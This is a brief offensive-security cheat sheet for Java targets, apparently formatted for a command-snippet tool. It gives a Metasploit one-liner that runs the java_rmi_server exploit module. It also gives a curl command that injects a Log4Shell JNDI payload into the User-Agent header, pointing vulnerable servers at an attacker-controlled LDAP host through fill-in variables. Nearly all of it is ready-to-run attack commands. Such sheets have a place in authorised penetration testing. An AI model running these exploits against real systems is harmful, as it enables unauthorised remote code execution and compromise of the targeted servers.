# Java

## exploit

### Java RMI Metasploit module

Use the Metasploit Java RMI server module.

```sh title:"Use Metasploit Java RMI server module"
msfconsole -x "use exploit/multi/misc/java_rmi_server; run; exit"
```
<!-- cheat -->

### Log4Shell User-Agent probe

Send a JNDI lookup string in the User-Agent header.

```sh title:"Send Log4Shell JNDI User-Agent probe"
curl -H 'User-Agent: ${jndi:ldap://$lhost:$lport}' "$url"
```
<!-- cheat
var lhost
var lport
var url
-->
